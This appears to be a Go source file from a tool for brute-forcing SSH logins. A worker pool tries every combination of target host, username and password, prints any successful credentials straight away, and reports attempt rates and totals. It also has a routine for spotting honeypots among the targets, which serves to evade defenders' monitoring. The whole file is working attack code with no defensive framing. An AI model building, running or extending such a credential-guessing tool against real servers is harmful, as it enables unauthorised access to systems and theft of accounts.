package main

import (
	"context"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"
)

// WorkerPool manages concurrent SSH brute force workers
type WorkerPool struct {
	workers    int
	jobQueue   chan Job
	resultChan chan Result
	ctx        context.Context
	cancel     context.CancelFunc
	wg         sync.WaitGroup
	mu         sync.Mutex
	results    []Result
	detector   *HoneypotDetector

	// Progress tracking
	totalJobs     int
	completedJobs int
	successCount  int
	startTime     time.Time
}

// NewWorkerPool creates a new worker pool
func NewWorkerPool(workers int) *WorkerPool {
	ctx, cancel := context.WithCancel(context.Background())

	return &WorkerPool{
		workers:    workers,
		jobQueue:   make(chan Job, workers*2), // Buffer for better performance
		resultChan: make(chan Result, workers*2),
		ctx:        ctx,
		cancel:     cancel,
		results:    make([]Result, 0),
		detector:   NewHoneypotDetector(),
		startTime:  time.Now(),
	}
}

// Close shuts down the worker pool and triggers garbage collection
func (wp *WorkerPool) Close() {
	close(wp.jobQueue)
	wp.cancel()
	wp.wg.Wait()
	close(wp.resultChan)

	// Force garbage collection
	runtime.GC()
	runtime.GC() // Call twice for better cleanup
}

// StartWorkers starts the worker goroutines
func (wp *WorkerPool) StartWorkers() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker(i)
	}
}

// worker processes jobs from the queue
func (wp *WorkerPool) worker(id int) {
	defer wp.wg.Done()

	for {
		select {
		case job, ok := <-wp.jobQueue:
			if !ok {
				return // Channel closed
			}

			// Process the job
			success, err := wp.trySSHLogin(job)
			result := Result{
				Job:     job,
				Success: success,
				Error:   err,
			}

			// Send result
			select {
			case wp.resultChan <- result:
			case <-wp.ctx.Done():
				return
			}

		case <-wp.ctx.Done():
			return
		}
	}
}

// BruteForceSSH starts the brute force process with worker pool
func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
	// Start workers
	wp.StartWorkers()

	// Start result collector
	go wp.collectResults()

	// Generate and queue jobs
	totalJobs := 0
	for _, target := range targets {
		// Parse target for host:port
		addr := target
		port := "22"
		if strings.Contains(target, ":") {
			parts := strings.Split(target, ":")
			addr = parts[0]
			port = parts[1]
		}

		for _, user := range users {
			for _, pass := range passwords {
				job := Job{
					Target:   fmt.Sprintf("%s:%s", addr, port),
					Username: user,
					Password: pass,
				}

				select {
				case wp.jobQueue <- job:
					totalJobs++
				case <-wp.ctx.Done():
					return
				}
			}
		}
	}

	wp.totalJobs = totalJobs
	fmt.Printf("Queued %d jobs for processing...\n", totalJobs)

	// Start progress updater
	go wp.updateProgress()

	// Wait for all jobs to complete
	wp.wg.Wait()

	// Print final results
	wp.printResults()
}

// collectResults collects and stores results
func (wp *WorkerPool) collectResults() {
	for result := range wp.resultChan {
		wp.mu.Lock()
		wp.results = append(wp.results, result)
		wp.completedJobs++
		if result.Success {
			wp.successCount++
		}
		wp.mu.Unlock()

		// Print success immediately (these are important)
		if result.Success {
			fmt.Printf("\n🎉 SUCCESS: %s:%s@%s\n", result.Job.Username, result.Job.Password, result.Job.Target)
		}
	}
}

// updateProgress updates the progress line in real-time
func (wp *WorkerPool) updateProgress() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			wp.mu.Lock()
			completed := wp.completedJobs
			success := wp.successCount
			total := wp.totalJobs
			wp.mu.Unlock()

			if completed < total {
				elapsed := time.Since(wp.startTime)
				rate := float64(completed) / elapsed.Seconds()
				remaining := time.Duration(float64(total-completed)/rate) * time.Second

				// Clear line and print progress
				fmt.Printf("\r\033[KProgress: %d/%d (%.1f%%) | Success: %d | Rate: %.1f/s | ETA: %v",
					completed, total, float64(completed)/float64(total)*100, success, rate, remaining.Round(time.Second))
			}
		case <-wp.ctx.Done():
			return
		}
	}
}

// printResults prints summary of all results
func (wp *WorkerPool) printResults() {
	wp.mu.Lock()
	defer wp.mu.Unlock()

	elapsed := time.Since(wp.startTime)
	rate := float64(wp.completedJobs) / elapsed.Seconds()

	fmt.Printf("\n\n=== SUMMARY ===\n")
	fmt.Printf("Total attempts: %d\n", wp.completedJobs)
	fmt.Printf("Successful logins: %d\n", wp.successCount)
	fmt.Printf("Failed attempts: %d\n", wp.completedJobs-wp.successCount)
	fmt.Printf("Time elapsed: %v\n", elapsed.Round(time.Second))
	fmt.Printf("Average rate: %.1f attempts/second\n", rate)
}

// CheckHoneypots analyzes targets for honeypot characteristics
func (wp *WorkerPool) CheckHoneypots(targets []string) map[string]*HoneypotInfo {
	honeypots := make(map[string]*HoneypotInfo)

	for _, target := range targets {
		info := wp.detector.AnalyzeTarget(target)
		if info.IsHoneypot {
			honeypots[target] = info
		}
	}

	return honeypots
}
